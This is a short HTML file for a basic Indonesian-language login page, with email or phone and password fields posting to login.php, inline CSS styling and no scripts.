<!DOCTYPE html>
<html>
<head>
    <title>Login - Akun Anda</title>
    <style>
        body { font-family: Arial; display: flex; justify-content: center; margin-top: 50px; }
        .login-box { border: 1px solid #ccc; padding: 20px; width: 300px; border-radius: 8px; }
        input { width: 100%; margin: 10px 0; padding: 8px; box-sizing: border-box; }
        button { width: 100%; background: #1877f2; color: white; border: none; padding: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Login</h2>
        <form action="login.php" method="POST">
            <input type="text" name="email" placeholder="Email atau Nomor Telepon" required>
            <input type="password" name="password" placeholder="Kata Sandi" required>
            <button type="submit">Masuk</button>
        </form>
    </div>
</body>
</html>
